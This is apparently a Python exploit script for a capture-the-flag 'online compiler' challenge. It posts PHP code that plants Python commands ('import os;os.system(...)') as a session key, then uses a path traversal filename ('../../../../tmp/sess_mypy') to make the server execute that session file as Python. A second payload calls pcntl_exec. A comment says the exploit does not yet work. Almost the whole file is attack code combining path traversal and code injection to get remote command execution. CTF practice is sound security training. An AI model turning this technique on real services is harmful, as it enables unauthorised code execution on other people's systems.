#!/usr/bin/env python3

# The "exploit" does not work yet
import requests

def compile_and_save(code, trial=False, remote=False):
	if remote:
		url = "http://onlinecompiler.2021.3k.ctf.to:5000/"

	else:
		url = "http://127.0.0.1:5000/"

	payload = {
		"c_type": "php",
		"code": code
	}

	response = requests.post(url+"save", data=payload)
	print("Save Response: " + response.text)
	filename = response.text

	if trial:
		payload_2 = {
			"c_type": "python",
			"filename": "../../../../../../../tmp/sess_mypy"
		}

	else:
		payload_2 = {
			"c_type": "php",
			"filename": filename
		}

	reponse_compile = requests.post(url+"compile", data=payload_2)
	print("Compile Response: " + reponse_compile.text)

test_code1 = """
<?php
echo pcntl_exec('/usr/bin/ls', ['/tmp']);
?>
"""

test_code = """
<?php
session_id('mypy');
session_start();
$_SESSION['import os;os.system("ls /tmp")#'] = 's';
?>
"""

remote = True

compile_and_save(test_code, remote=remote, trial=False)
compile_and_save("", remote=remote, trial=True)
